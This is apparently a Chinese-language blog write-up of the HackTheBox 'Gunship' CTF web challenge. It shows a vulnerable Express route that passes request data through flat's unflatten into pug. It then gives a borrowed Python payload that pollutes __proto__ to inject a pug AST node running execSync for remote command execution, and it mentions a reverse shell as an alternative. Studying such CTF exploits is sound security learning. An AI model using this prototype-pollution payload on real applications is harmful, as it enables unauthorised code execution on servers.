---
title: HackTheBox-GunShip
typora-root-url: ..
date: 2021-12-07 13:03:48
tags:
 - HTB
 - WEB
---

## 简介

题目：Gunship

难度：VERY EASY

WEB中最简单的一道题，着实把我难道了，没想到第一个题就将我打到自闭😂😂



## 解题思路

首先观察网页，有一个输入框，输入 artist 的名字即可。

![image-20211207132506799](/assets/image-20211207132506799.png)



查看源代码  entrypoint.sh ，可以发现flag被添加上随机名后放到了网站的根目录下（爆破需要 (26+26+10)的5次方次 ），爆破不是正常道路

查看源代码 index.js，一脸懵逼

```javascript
const path              = require('path');
const express           = require('express');
const pug        		= require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
```



搜索writeup,才知道和node 的AST注入有关，可通过注入模板达到RCE的目的 参考[文章](https://sec.stealthcopter.com/htb-ctf-write-up-gunship/)

看完没看懂，白嫖 payload 如下：

```javascript
import requests

TARGET_URL = 'http://localhost:1337'
TARGET_URL = 'http://docker.hackthebox.eu:30448'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = {
   "artist.name":"Gingell", 
       "__proto__.abcdezj": { 
           "type":"Text", 
           "line":"process.mainModule.require('child_process').execSync('ls > /app/static/out')" 
       } 
})

print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/out').text)
```



通过命令执行，将结果输出到文件中，或直接反弹shell即可拿到flag





## 参考文章

- https://blog.p6.is/AST-Injection/#Exploit

- https://sec.stealthcopter.com/htb-ctf-write-up-gunship/

  
